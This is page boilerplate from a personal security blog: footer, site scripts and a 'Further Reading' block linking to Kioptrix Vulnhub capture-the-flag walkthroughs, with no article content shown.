href="/tags/30x/">30x</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/KIOPTRIX_LEVEL_1.1/"><div class="card-body"> <span class="timeago small" > Jul 19 <i class="unloaded">2021-07-19T23:42:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>KIOPTRIX LEVEL 1.1 (#2) - Vulnhub Walkthrough</h3><div class="text-muted small"><p> Introduction This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of t...</p></div></div></a></div><div class="card"> <a href="/posts/KIOPTRIX_LEVEL_1.2/"><div class="card-body"> <span class="timeago small" > Jul 21 <i class="unloaded">2021-07-21T11:13:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>KIOPTRIX LEVEL 1.2 (#3) - Vulnhub Walkthrough</h3><div class="text-muted small"><p> Introduction This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of t...</p></div></div></a></div><div class="card"> <a href="/posts/KIOPTRIX_LEVEL_1.3/"><div class="card-body"> <span class="timeago small" > Jul 22 <i class="unloaded">2021-07-22T05:35:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>KIOPTRIX LEVEL 1.3 (#4) - Vulnhub Walkthrough</h3><div class="text-muted small"><p> Introduction This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of t...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <span class="btn btn-outline-primary disabled" prompt="Older"><p>-</p></span> <a href="/posts/KIOPTRIX_LEVEL_1.1/" class="btn btn-outline-primary" prompt="Newer"><p>KIOPTRIX LEVEL 1.1 (#2) - Vulnhub Walkthrough</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://twitter.com/maaelhamid">Mohamed Ayman</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/vulnhub/">vulnhub</a> <a class="post-tag" href="/tags/privilege-escalation/">privilege_escalation</a> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/kioptrix/">kioptrix</a> <a class="post-tag" href="/tags/escalate-my-privileges/">ESCALATE_MY_PRIVILEGES</a> <a class="post-tag" href="/tags/suid/">SUID</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/30x/">30x</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="http://maaelhamid.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script async src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script>
